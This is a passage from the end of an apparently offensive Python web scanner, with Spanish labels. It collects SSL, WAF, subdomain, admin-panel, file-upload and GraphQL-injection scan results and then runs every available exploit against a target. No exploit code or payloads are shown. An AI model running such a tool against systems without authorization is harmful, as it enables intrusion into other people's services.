        "ssl": check_ssl_vulnerabilities(target),
        "waf": advanced_waf_detection(target),
        "tecnologias": enhanced_fingerprint_tech(target),
        "subdominios": advanced_aggressive_subdomain_scan(target, threads),
        "paneles_admin": detect_admin_panels(target),
        "file_uploads": scan_file_uploads(target),
        "graphql": scan_graphql_injection(target),
        "exploits": [],
    }

    # Ejecutar todos los exploits disponibles
    for exploit in list_exploits():
        res = run_exploit(exploit, target)
        if isinstance(res, list):
            results["exploits"].extend(res)
        else:
            results["exploits"].append(res)

    if args.json:
        generate_report(results)
    else:
        print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
